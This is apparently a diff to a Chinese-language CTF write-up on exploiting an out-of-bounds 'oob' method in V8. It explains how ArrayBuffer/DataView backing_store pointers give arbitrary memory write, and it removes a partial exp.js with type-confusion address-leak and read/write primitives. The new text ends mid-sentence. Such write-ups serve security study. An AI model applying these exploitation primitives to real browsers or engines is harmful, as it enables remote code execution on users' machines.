@@ -458,78 +458,30 @@ function arb_read(addr) {
 }
 ```
 
-但是上面使用 FloatArray 进行写入的时候，在目标地址高位是 0x7f 等情况下，会出现低 18 位被置零的现象，可以通过 DataView 的利用来解决：
+但是上面使用 FloatArray 进行写入的时候，在目标地址高位是 0x7f 等情况下，会出现低 18 位被置零的现象，可以通过 ArrayBuffer 的利用来解决（这也是绕过没有沙盒的指针压缩的常见思路，因为 ArrayBuffer 的储存空间使用 [PartitionAlloc](https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md) 分配，位于 v8 堆之外的单独内存区域中）：
 
-- DataView 对象中的有如下指针关系：
-  - `DataView -> buffer -> backing_store -> 存储内容`；
-  - 即 `backing_store` 指针指向了 DataView 申请的 Buffer 真正的内存地址；
+- `DataView(ArrayBuffer)` 对象中的有如下指针关系：
+  - ArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区；
+  - 但是 ArrayBuffer 不能直接操作，需要通过 DataView 对象来提供读写多种数据类型的底层接口，因此不需要考虑字节序等问题；
+  - 利用时可以考虑 `DataView -> buffer -> backing_store -> 存储内容`；
+  - 即 `backing_store` 指针指向了 ArrayBuffer 真正的内存地址；
 
 改进如下:
 
 ```javascript
-var data_buf = new ArrayBuffer(8)
-var data_view = new DataView(data_buf)
-var buf_backing_store_addr = get_addr(data_buf) + 0x20n
-function writeDataview(addr, data) {
-  arb_write(buf_backing_store_addr, addr)
-  data_view.setBigUint64(0, data, true)
-  console.log("[*] write to : 0x" + hex(addr) + ": 0x" + hex(data))
+let data_buf = new ArrayBuffer(8);
+let data_view = new DataView(data_buf);
+let buf_backing_store_addr = get_addr(data_buf) + 0x20n;
+
+function arb_write64(addr, data) {
+  arb_write(buf_backing_store_addr, addr);
+  data_view.setBigUint64(0, data, true);
+  console.log(
+    "[DEBUG] Writing 0x" + helper.hex(data) + " to 0x" + helper.hex(addr),
+  );
 }
 ```
 
----
-
-综上, 现在已经实现了任意地址写, 本地getshell还是考虑借助libc中的freehook, 至于地址泄露, 往前找肯定会存在我们需要的地址, 我们拥有很强的任意地址读写, 所以这不是一件难事:
-
-exp.js:
-
-```javascript
-// auxiliary funcs to convert between doubles and u64s
-var buf = new ArrayBuffer(16);
-var float64 = new Float64Array(buf);
-var bigUint64 = new BigUint64Array(buf);
-
-function f2i( f ) {
-    float64[0] = f;
-    return bigUint64[0];
-}
-function i2f( i ) {
-    bigUint64[0] = i;
-    return float64[0];
-}
-function hex( x ) {
-    return x.toString(16).padStart(16, "0");
-}
-
-
-// type confusion demo
-var obj = {};
-var obj_list = [obj];
-var float_list = [4.3];
-
-var obj_map = obj_list.oob();
-var float_map = float_list.oob();
-
-// obj_list.oob(float_map);
-// var obj_addr = f2i(obj_list[0]) - 0x1n;
-// obj_list.oob(obj_map);
-// console.log("[DEMO] addr of obj is: 0x" + hex(obj_addr));
-// %DebugPrint(obj);
-// %SystemBreak();
-
-
-// arbitary read and write
-function get_addr( target_obj ) {
-    obj_list[0] = target_obj;
-    obj_list.oob(float_map);
-    let res = f2i(obj_list[0]) - 1n;
-    obj_list.oob(obj_map);
-    return res;
-}
-function get_obj( target_addr ) {
-    float_list[0] = i2f(target_addr + 1n);
-    float_list.oob(obj_map);
-    l
-```
+现在获得了任意地址读写，最简单的方法就是
 
 [ref](https://cloud.tencent.com/developer/article/1764424)
